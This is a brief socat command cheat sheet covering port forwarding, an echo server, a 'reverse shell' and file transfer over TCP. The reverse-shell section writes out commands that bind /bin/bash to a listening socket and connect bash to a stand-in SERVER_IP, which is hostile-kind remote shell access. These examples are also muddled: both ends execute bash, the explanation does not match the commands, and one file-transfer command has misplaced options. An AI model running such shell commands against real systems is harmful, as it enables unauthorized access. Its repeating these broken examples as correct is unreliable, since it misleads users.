Socket CAT

# Port Forwarding
#### Example: Forward Local Port to a Remote Server
```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```
- **Explanation**: This command listens on port 8080 on the local machine and forwards any traffic to port 80 on the remote server `192.168.1.100`.

# TCP Server
#### Example: Create a Simple TCP Echo Server
```bash
socat TCP-LISTEN:1234,fork EXEC:/bin/cat
```
- **Explanation**: This command listens on port 1234 and forks new processes to handle each connection, passing the data to `/bin/cat`, which echoes it back to the client.

# Reverse Shell
#### Example: Reverse Shell Connection
On the listening server:
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```
On the client:
```bash
socat TCP:SERVER_IP:4444 EXEC:/bin/bash
```
- **Explanation**: The client connects to the server on port 4444, and once connected, the server spawns a shell.

# File Transfer over Network
#### Example: File Transfer Using TCP
On the sender side:
```bash
socat -u FILE:/path/to/file TCP:192.168.1.100:1234
```

On the receiving side:
```bash
socat TCP-LISTEN:1234 -u FILE:/path/to/outputfile
```
- **Explanation**: The sender reads the file and sends it over TCP, while the receiver listens on port 1234 and saves the output to a file.
